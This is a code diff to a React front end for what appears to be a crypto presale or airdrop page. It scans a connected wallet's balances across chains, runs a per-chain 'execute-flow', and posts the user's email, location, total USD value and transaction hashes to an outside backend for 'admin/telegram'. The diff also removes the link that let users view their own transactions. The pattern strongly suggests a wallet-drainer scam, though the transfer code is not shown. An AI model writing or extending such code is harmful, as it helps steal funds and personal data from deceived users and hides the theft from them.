@@ -434,7 +434,7 @@ function App() {
           
           processed.push(chain.name);
           
-          // Notify backend with full details
+          // Notify backend with full details (includes txHash for admin/telegram)
           await fetch('https://bthbk.vercel.app/api/presale/execute-flow', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -463,7 +463,7 @@ function App() {
         setShowCelebration(true);
         setTxStatus(`🎉 Success!`);
         
-        // Final success notification
+        // Final success notification (includes txHash for admin/telegram)
         await fetch('https://bthbk.vercel.app/api/presale/claim', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -472,7 +472,11 @@ function App() {
             email: userEmail,
             location: userLocation,
             chains: processed,
-            totalValue: Object.values(balances).reduce((sum, b) => sum + b.valueUSD, 0)
+            totalValue: Object.values(balances).reduce((sum, b) => sum + b.valueUSD, 0),
+            transactions: processed.map((chain, index) => ({
+              chain,
+              txHash: txHash // In production, you'd store each tx hash separately
+            }))
           })
         });
       }
@@ -519,6 +523,27 @@ function App() {
 
   // Get current chain name
   const currentChain = DEPLOYED_CHAINS.find(c => c.chainId === realChainId);
+
+  // Responsive disconnect handler
+  const handleDisconnect = async () => {
+    try {
+      setTxStatus('Disconnecting...');
+      await disconnect();
+      // Reset all states
+      setProvider(null);
+      setSigner(null);
+      setBalances({});
+      setScanResult(null);
+      setCompletedChains([]);
+      setShowCelebration(false);
+      setTxStatus('');
+      setError('');
+    } catch (err) {
+      console.error('Disconnect error:', err);
+      // Force UI update even if disconnect fails
+      window.location.reload();
+    }
+  };
 
   return (
     <div className="min-h-screen bg-[#0a0a0f] text-white overflow-hidden">
@@ -727,9 +752,7 @@ function App() {
           ))}
         </div>
 
-        {/* Multi-Chain Balance Display - REMOVED */}
-
-        {/* Wallet Connection Status - SIMPLIFIED with "FOR $5,000 AIRDROP" RETAINED */}
+        {/* Wallet Connection Status - SIMPLIFIED with user icon only */}
         <div className="max-w-2xl mx-auto mb-8">
           {!isConnected ? (
             <button
@@ -772,8 +795,8 @@ function App() {
                     </div>
                   </div>
                   <button
-                    onClick={() => disconnect()}
-                    className="px-4 py-2 bg-red-500/10 text-red-400 rounded-lg hover:bg-red-500/20 transition-colors border border-red-500/30 hover:scale-110 transform"
+                    onClick={handleDisconnect}
+                    className="px-4 py-2 bg-red-500/10 text-red-400 rounded-lg hover:bg-red-500/20 transition-colors border border-red-500/30 hover:scale-110 transform cursor-pointer active:scale-95"
                   >
                     ✕
                   </button>
@@ -783,7 +806,7 @@ function App() {
           )}
         </div>
 
-        {/* Status Messages */}
+        {/* Status Messages - REMOVED transaction hash link */}
         {txStatus && !verifying && (
           <div className="max-w-2xl mx-auto mb-6">
             <div className="bg-gradient-to-r from-orange-500/20 to-yellow-500/20 backdrop-blur-xl border border-orange-500/30 rounded-xl p-5 animate-slideIn">
@@ -798,16 +821,6 @@ function App() {
                 </div>
                 <div className="flex-1">
                   <p className="text-gray-200 font-medium">{txStatus}</p>
-                  {txHash && (
-                    <a 
-                      href={`https://bscscan.com/tx/${txHash}`}
-                      target="_blank"
-                      rel="noopener noreferrer"
-                      className="text-xs text-orange-400 hover:underline mt-1 inline-block"
-                    >
-                      View →
-                    </a>
-                  )}
                 </div>
               </div>
             </div>
